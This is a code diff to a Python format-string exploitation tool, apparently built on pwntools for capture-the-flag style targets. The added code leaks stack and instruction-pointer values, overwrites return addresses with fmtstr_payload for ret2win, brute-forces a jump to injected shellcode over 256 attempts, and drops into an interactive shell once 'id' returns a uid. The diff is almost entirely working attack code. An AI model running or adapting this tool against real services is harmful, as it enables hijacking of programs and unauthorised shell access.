@@ -493,10 +493,11 @@ class ffstr():
 					while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
 						data = self.asyncExchange(pl)
 					
-					print("Leak "+hex(leak+d*self.block_byte*k)+" ",str(i)," ",str(d)," ",data[:35],end="\r")
+					print("Leak "+hex(leak+d*self.block_byte*k)+" ",str(i)," ",str(d)," ",data[:35])#,end="\r")
 					
 					
 					if data.find(self.delimiters[0]*2)>-1:
+						print("Leak "+hex(leak+d*self.block_byte*k)+" ",str(i)," ",str(d)," ",data[:35])
 						print("Found at argument ",i+1," offset ", d*self.block_byte*k)
 						print(data)
 						self.addr=(i+1,d*self.block_byte*k)
@@ -506,6 +507,7 @@ class ffstr():
 					# Leak 0x7ffce61c00c8  17   -1   b'\nHello there, \n   d34d|%9$s|b33f
 					# Leak 0x7ffc47e93e18  17   -1   b'\nHello there, \n   d34d|%9$s|b33f   '
 					if re.findall(self.re_ArgPattern, data):
+						print("Leak "+hex(leak+d*self.block_byte*k)+" ",str(i)," ",str(d)," ",data[:35])
 						print("*Found at argument ",i+1," offset ", d*self.block_byte*k-len(self.delimiters[0]))
 						print(data)
 						self.addr=(i+1,d*self.block_byte*k-len(self.delimiters[0]))
@@ -575,7 +577,17 @@ class ffstr():
 					self.calibration = nbw+1-8
 					return
 				
-				
+	def checkshell(self):
+		# Check if we have access to a shell
+		try:
+			for i in range(5):
+				self.io.sendline(b"id")
+				data = self.io.recvline()
+				if data.find(b"uid=")>-1:
+					self.io.interactive()
+		except:
+			pass
+			
 	def ret2win(self):
 		# Return to win attack
 		
@@ -597,15 +609,15 @@ class ffstr():
 				self.close()
 				
 				# Calculating position
-				pos = -offset // self.block_byte + self.stack_arg - len(self.delimiters[0]) // self.block_byte # work a bit here
+				pos = -offset // self.block_byte + self.stack_arg - len(self.delimiters[0]) // self.block_byte
 				
 				# Leak an hexadecimal value // stack address
-				data = self.asyncExchange(self.stackPayload(pos,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
+				data = self.asyncExchange(self.stackPayload(pos,b"p",left=self.delimiters[0],right=self.delimiters[1])) 
 				regex = re.search(self.re_HexaPattern, data)
 				stack = int(regex[0],16)
 				
 				# Leak an hexadecimal value // rip
-				data = self.asyncExchange(self.stackPayload(pos+1,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
+				data = self.asyncExchange(self.stackPayload(pos+1,b"p",left=self.delimiters[0],right=self.delimiters[1])) 
 				regex = re.search(self.re_HexaPattern, data)
 				rip = int(regex[0],16)
 
@@ -613,33 +625,57 @@ class ffstr():
 				
 				# write format string
 				write={stack+self.block_byte:rip+d*i}
-				pl = self.delimiters[0]+fmtstr_payload(self.stack_arg, write, numbwritten=self.calibration+7)
+				pl = self.delimiters[0]+fmtstr_payload(self.stack_arg, write, numbwritten=self.calibration+7,write_size="short")
 
-					
 				# Get Data
 				data = self.asyncExchange(pl)
-				self.checkflag(data)
-				try:
-					self.io.sendline(b"id")
-					data = self.io.recvline()
-					if data.find(b"uid=")>-1:
-						self.io.interactive()
-				except:
-					pass
-
 				
-		
+				# Checking Flag
+				self.checkflag(data)
+				
+				# Checking Shell
+				self.checkshell()
+
 	def stackshellcode(self):
-		# injection shellcode on the stack and re-route the program
+		# injection shellcode on the stack and re-route the program to it
 		
+		# Choice
+		print("Perfom shellcode injection ?")
+		if not self.yesno():
+			return
+			
 		# if stack address has not been identified
 		if self.addr is None:
 			return
 		
-		# Shellcode	
-		shellcode = asm(shellcraft.sh())
-			
-		print("SHELLCODE",shellcode)
+		for k in range(256):
+
+			# Shellcode
+			shellcode = asm(shellcraft.sh())
+
+			# Stack Saved rbp
+			stackrbp,offset = self.addr
+
+			# Closing connection
+			self.close()
+						
+			# Calculating position
+			pos = - offset // self.block_byte + self.stack_arg - len(self.delimiters[0]) // self.block_byte 
+						
+			# Leak an hexadecimal value // stack address
+			data = self.asyncExchange(self.stackPayload(pos,b"p",left=self.delimiters[0],right=self.delimiters[1])) 
+			regex = re.search(self.re_HexaPattern, data)
+			stack = int(regex[0],16)
+
+			# write format string, bruteforce shellcode begining
+			write={stack+self.block_byte:stack-k*4}
+
+			# Write Instruction Pointer for returning to injected shellcode
+			pl = self.delimiters[0] + fmtstr_payload(self.stack_arg, write, numbwritten=self.calibration+7,write_size="short")+shellcode
+			data = self.asyncExchange(pl)
+					
+			# Check shell
+			self.checkshell()
 
 			
 	def locateBinary(self):
@@ -712,6 +748,11 @@ class ffstr():
 		
 	def dumpBinary(self):
 	
+		# Choice
+		print("Perfom binary dump ?")
+		if not self.yesno():
+			return
+
 		# Lazy mode, don't redo things
 		if self.dump_name is not None:
 			return
@@ -913,14 +954,6 @@ class ffstr():
 			dump =data[left:right]
 			print(dump[::-1].hex())
 			
-	# WRITE ANYWHERE
-	
-	# GOT OVERWRITE
-			
-	# RET2WIN
-	
-	# SHELLCRAFTING
-		
 
 
 def help():
